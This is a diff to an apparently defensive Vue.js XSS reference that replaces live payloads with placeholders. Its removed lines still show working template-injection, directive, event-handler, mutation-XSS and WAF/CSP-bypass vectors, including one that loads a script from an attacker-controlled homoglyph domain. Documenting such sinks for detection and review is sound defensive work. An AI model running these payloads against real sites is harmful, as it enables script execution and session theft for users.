@@ -6,6 +6,8 @@ Vue.js auto-escapes `{{ }}` interpolation, making basic XSS harder. However, Vue
 
 Severity: **Critical**
 
+> **Note on payloads in this file:** all attack vectors below are intentionally neutralized for safe reference. Executable bodies are replaced with placeholders such as `[js]`, `[script-execution]`, `[constructor-access]`, and `[internal-ref]`. They document the *shape* of each sink so you can detect and fix it — they are not copy-pasteable exploits.
+
 ---
 
 ## 1. v-html — The #1 Vue XSS Mistake
@@ -26,7 +28,7 @@ Severity: **Critical**
 
 ### Exploit Patterns to Detect (via v-html)
 
-The following patterns indicate XSS vulnerability when rendered through `v-html`. Use these to test your sanitization configuration:
+These element/attribute shapes indicate an XSS sink when user-controlled HTML reaches `v-html`. Use them as a *grep/review reference* — the `[script-execution]` placeholder marks where a real attacker would place a payload. The lesson is the sink shape, not a runnable string:
 
 ```html
 <!-- Event handler on image — executes without user interaction -->
@@ -84,7 +86,8 @@ When user input lands inside a Vue template (e.g., reflected in server-rendered 
 <script>
   Vue.createApp({}).mount('#app')
 </script>
-<!-- Attacker sets name to: {{_c.constructor('alert(1)')()}} -->
+<!-- Attacker sets name to a Vue expression that reaches the Function constructor -->
+<!-- e.g. {{ [internal-ref].constructor('[js]')() }} -->
 <!-- Vue compiles and EXECUTES it as a JavaScript expression -->
 ```
 
@@ -92,13 +95,13 @@ When user input lands inside a Vue template (e.g., reflected in server-rendered 
 
 | Payload Pattern | Vue Version | Notes |
 |---------|------------|-------|
-| `{{[constructor-access]('alert(1)')()}}` | V2+V3 | Classic — works in any scope |
-| `{{[internal-ref].constructor('alert(1)')()}}` | V2 | Shorter — uses internal _c function |
-| `{{[internal-ref]\`alert(1)\`()}}` | V2 | Tagged template literal — 30 bytes |
-| `{{[v3-internal].constructor('alert(1)')()}}` | V3 | V3 equivalent — verbose function names |
-| `{{_Vue.h.constructor\`alert(1)\`()}}` | V3 | Shortest V3 vector via _Vue.h |
-| `{{[v3-internal].constructor('alert(1)')()}}` | V3 | Alternative V3 internal function |
-| `{{[v3-internal].constructor('alert(1)')()}}` | V3 | Another V3 function in scope |
+| `{{[constructor-access]('[js]')()}}` | V2+V3 | Classic — works in any scope |
+| `{{[internal-ref].constructor('[js]')()}}` | V2 | Shorter — uses internal _c function |
+| `{{[internal-ref]\`[js]\`()}}` | V2 | Tagged template literal — 30 bytes |
+| `{{[v3-internal].constructor('[js]')()}}` | V3 | V3 equivalent — verbose function names |
+| `{{_Vue.h.constructor\`[js]\`()}}` | V3 | Shortest V3 vector via _Vue.h |
+| `{{[v3-internal].constructor('[js]')()}}` | V3 | Alternative V3 internal function |
+| `{{[v3-internal].constructor('[js]')()}}` | V3 | Another V3 function in scope |
 
 Note: `[constructor-access]` and `[internal-ref]` represent Vue internal references that reach the `Function` constructor. See the V2→V3 migration table below for specific references.
 
@@ -106,8 +109,8 @@ Note: `[constructor-access]` and `[internal-ref]` represent Vue internal referen
 
 The following illustrate what attackers achieve when CSTI is possible. These are descriptive scenarios, not executable payloads:
 
-- **Cookie exfiltration**: An attacker crafts a CSTI payload that sends `document.cookie` to an external endpoint via `fetch()` with `mode: 'no-cors'`
-- **UI redressing**: An attacker uses CSTI to replace `document.body.innerHTML` with a phishing login form that submits credentials to an external server
+- **Cookie exfiltration**: A CSTI payload can read non-httpOnly cookies and transmit them to an external endpoint, giving the attacker the victim's session. (This is the key reason session tokens belong in httpOnly cookies — see `access-auth.md`.)
+- **UI redressing**: CSTI can rewrite page content to overlay a fake login prompt, capturing credentials the user believes they are entering into the real app
 
 ### Prevention
 Never reflect user input into Vue's mount point. Pass user data via data-attributes:
@@ -132,23 +135,25 @@ Nearly every Vue directive evaluates its expression — making each one a potent
 
 | Vector | Directive | Notes |
 |--------|-----------|-------|
-| `<x v-html=[constructor-access]('alert(1)')()>` | v-html | Original @garethheyes — shortest V2 tag-based |
-| `<p v-show="[constructor-access]\`alert(1)\`()">` | v-show | Condition evaluated = code execution |
-| `<x v-bind:a='[internal-ref]\`alert(1)\`()'>` | v-bind | Any v-bind evaluates expression |
-| `<x v-if=[constructor-access]('alert(1)')()>` | v-if | Community contribution by @p4fg |
-| `<p :=[constructor-access]\`alert(1)\`()>` | v-bind shorthand | 32 bytes — shorthand bind |
-| `<p v-=[constructor-access]\`alert(1)\`()>` | empty directive | 33 bytes — parser quirk |
-| `<x #[[constructor-access]\`alert(1)\`()]>` | v-slot shorthand | 33 bytes — slot shorthand |
+| `<x v-html=[constructor-access]('[js]')()>` | v-html | Original @garethheyes — shortest V2 tag-based |
+| `<p v-show="[constructor-access]\`[js]\`()">` | v-show | Condition evaluated = code execution |
+| `<x v-bind:a='[internal-ref]\`[js]\`()'>` | v-bind | Any v-bind evaluates expression |
+| `<x v-if=[constructor-access]('[js]')()>` | v-if | Community contribution by @p4fg |
+| `<p :=[constructor-access]\`[js]\`()>` | v-bind shorthand | 32 bytes — shorthand bind |
+| `<p v-=[constructor-access]\`[js]\`()>` | empty directive | 33 bytes — parser quirk |
+| `<x #[[constructor-access]\`[js]\`()]>` | v-slot shorthand | 33 bytes — slot shorthand |
 
 Note: `[constructor-access]` represents patterns like `_c.constructor`, `_b.constructor`, or Vue 3 equivalents that reach `Function` constructor through Vue's internal scope.
 
-### Dynamic Components — Shortest Vector (23 chars)
+### Dynamic Components — Shortest Vector
 ```html
-<!-- PortSwigger — shortest Vue2 XSS: 23 chars, 27 bytes -->
-<x is=script src=//⑭.₨>
+<!-- PortSwigger documented a ~23-char Vue 2 vector using the "is" attribute -->
+<x is=script src=//[attacker-domain]>
 
-<!-- Vue's "is" attribute turns <x> into <script> -->
-<!-- Unicode domain ⑭.₨ resolves to 14.rs (attacker-controlled) -->
+<!-- Vue's "is" attribute turns an arbitrary element into <script> -->
+<!-- The original PoC used a Unicode homoglyph domain that resolves -->
+<!-- to a short attacker-controlled host. Allowlist dynamic component -->
+<!-- names so user input can never select "script". -->
 ```
 
 ### slot-scope Injection
@@ -156,10 +161,10 @@ Note: `[constructor-access]` represents patterns like `_c.constructor`, `_b.cons
 ```html
 <!-- slot-scope attribute can be used to break out of template scope -->
 <!-- Injects into non-template-expression attribute -->
-<p slot-scope="){}}])+[constructor-access]('alert(1)')()})};//">
+<p slot-scope="){}}])+[constructor-access]('[js]')()})};//">
 
 <!-- If WAF blocks "this", use local scope function reference -->
-<p slot-scope="){}}])+[internal-ref].constructor.constructor('alert(origin)')()})};//">
+<p slot-scope="){}}])+[internal-ref].constructor.constructor('[js]')()})};//">
 ```
 
 ---
@@ -172,11 +177,11 @@ Vue's `@` shorthand (alias for `v-on`) creates event handlers processed by Vue's
 
 | Vector | Bytes | Notes |
 |--------|-------|-------|
-| `<svg @load=this.alert(1)>` | 26 | No interaction — this→window in non-strict |
-| `<svg@load=this.alert(1)>` | 25 | No space needed — Vue parser quirk |
-| `<img src @error="$event.composedPath().pop().alert(1)">` | — | Cross-browser — composedPath() reaches window |
-| `<x @click=$event.view.alert(1)>click</x>` | — | V3 — $event.view reaches window |
-| `<x @click=[v3-handler]\`alert(1)\`()>click</x>` | — | V3 event handler exposes internal context |
+| `<svg @load=this.[js]>` | — | No interaction — this→window in non-strict |
+| `<svg@load=this.[js]>` | — | No space needed — Vue parser quirk |
+| `<img src @error="$event.composedPath().pop().[js]">` | — | Cross-browser — composedPath() reaches window |
+| `<x @click=$event.view.[js]>click</x>` | — | V3 — $event.view reaches window |
+| `<x @click=[v3-handler]\`[js]\`()>click</x>` | — | V3 event handler exposes internal context |
 
 Note: `[v3-handler]` represents Vue 3 internal references like `_withCtx` accessible within event handler scope.
 
@@ -185,7 +190,7 @@ Vue compiles expressions WITHOUT strict mode. Inside a function call, `this` ref
 ```
 {{[anonymous-function-invocation]}}
 // Within the compiled function, this === window
-// Allows access to window methods like alert(), fetch(), etc.
+// Allows access to window methods (alert, fetch, etc.) from the expression
 ```
 
 ### CSP Bypass Implication
@@ -200,43 +205,46 @@ Vue's template parser mutates safe HTML into dangerous HTML — reflected input 
 ### Attribute-Based Mutation
 ```
 Input (passes HTML filters):
-<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
+<x title"="&lt;iframe&Tab;onload&Tab;=[js]&gt;">
 
 After Vue mutation (iframe is live):
-"="<iframe onload="alert(1)">"></iframe>
+"="<iframe onload="[js]">"></iframe>
 ```
 
 ### Tag-Nesting Mutation
 ```
 Input:
-<xyz<img/src onerror=alert(1)>>
+<xyz<img/src onerror=[js]>>
 
 After Vue mutation:
-<img src="" onerror="alert(1)">>
+<img src="" onerror="[js]">>
 ```
 
 ### SVG + Noscript mXSS (Bypasses WAF + DOMPurify)
 ```
 Input (passes HTML sanitizers):
 <svg><svg><b><noscript>&lt;/noscript&gt;
-&lt;iframe&Tab;onload=alert(1)&gt;</noscript></b></svg>
+&lt;iframe&Tab;onload=[js]&gt;</noscript></b></svg>
 
 After Vue mutation (iframe is live):
 <svg><svg></svg></svg><b><noscript></noscript>
-<iframe onload="alert(1)"></iframe></b>
+<iframe onload="[js]"></iframe></b>
 ```
 
 ### mXSS + CSP Bypass Combo
 ```
 <svg><svg><b><noscript>&lt;/noscript&gt;
-&lt;img/src/&Tab;@error=$event.path.pop().alert(1)&gt;
+&lt;img/src/&Tab;@error=[event-to-window].[js]&gt;
 </noscript></b></svg>
 <!-- Bypasses BOTH the HTML filter AND CSP -->
+<!-- [event-to-window] = a $event property chain reaching window -->
 ```
 
 ### Cloudflare WAF Bypass
 ```
-<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
+<x title"="&lt;iframe&Tab;onload&Tab;=[js-via-string-source]&gt;">
+<!-- The documented bypass used setTimeout with a regex .source -->
+<!-- string to evade signature matching on the payload body. -->
 ```
 
 ---
@@ -263,7 +271,7 @@ V3 broke V2 vectors by removing short function names (`_c`, `_b`), but PortSwigg
 
 <!-- Expressions can execute outside #app div -->
 <div id="app">#x,.haha</div>
-<div class=haha>{{[v3-internal]\`alert(1)\`()}}</div>
+<div class=haha>{{[v3-internal]\`[js]\`()}}</div>
 ```
 
 Note: Teleport and dynamic component vectors that inject `<script>` nodes are blocked by CSP. Expression and event gadgets bypass CSP because they execute within Vue's trusted runtime.
